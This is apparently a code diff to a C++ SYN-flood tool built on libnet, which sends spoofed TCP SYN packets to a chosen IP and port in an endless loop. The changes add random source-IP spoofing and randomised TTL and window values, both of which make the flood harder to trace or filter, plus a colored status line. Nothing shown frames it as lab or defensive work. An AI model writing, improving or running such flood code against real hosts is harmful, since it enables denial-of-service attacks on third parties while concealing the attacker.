@@ -1,3 +1,4 @@
+#include <arpa/inet.h>
 #include <cstdlib>
 #include <iostream>
 #include <libnet.h>
@@ -5,6 +6,10 @@
 #include <libnet/libnet-headers.h>
 #include <pcap.h>
 #include <pcap/pcap.h>
+
+char *print_ip(uint32_t *ip_addr_ptr) {
+  return inet_ntoa(*((struct in_addr *)ip_addr_ptr));
+}
 
 int syn_flood() {
   std::string ip;
@@ -51,25 +56,28 @@ int syn_flood() {
   }
   uint16_t dst_port = (uint16_t)port;
 
+  std::cout << "  \033[38;5;196mSYN-flood:\t" << print_ip(&dst_ip) << ":"
+            << dst_port << "..." << "\033[0m" << std::endl;
+  // std::cout << "Press 'Enter' to close";
   while (true) {
     libnet_clear_packet(l);
 
     libnet_ptag_t tcp_tag = libnet_build_tcp(
         libnet_get_prand(LIBNET_PRu16), dst_port,
         libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32), TH_SYN,
-        0, 0, 0, LIBNET_TCP_H, nullptr, 0, l, 0);
+        libnet_get_prand(LIBNET_PRu16), 0, 0, LIBNET_TCP_H, nullptr, 0, l, 0);
 
     if (tcp_tag == (libnet_ptag_t)-1) {
       std::cerr << "Error building TCP: " << libnet_geterror(l) << std::endl;
       continue;
     }
 
-    libnet_ptag_t ip_tag =
-        libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, IPTOS_LOWDELAY,
-                          libnet_get_prand(LIBNET_PRu16), 0, 64, IPPROTO_TCP, 0,
-                          libnet_get_ipaddr4(l), dst_ip, nullptr, 0, l, 0
+    libnet_ptag_t ip_tag = libnet_build_ipv4(
+        LIBNET_IPV4_H + LIBNET_TCP_H, IPTOS_LOWDELAY,
+        libnet_get_prand(LIBNET_PRu16), 0, libnet_get_prand(LIBNET_PR8),
+        IPPROTO_TCP, 0, libnet_get_prand(LIBNET_PRu32), dst_ip, nullptr, 0, l, 0
 
-        );
+    );
 
     if (ip_tag == (libnet_ptag_t)-1) {
       std::cerr << "Error building IP: " << libnet_geterror(l) << std::endl;
@@ -79,8 +87,6 @@ int syn_flood() {
     int bytes = libnet_write(l);
     if (bytes == -1) {
       std::cerr << "Write error: " << libnet_geterror(l) << std::endl;
-    } else {
-      std::cout << "  \033[38;5;196mSent " << bytes << " bytes\033[0m\n";
     }
 
     usleep(5000);
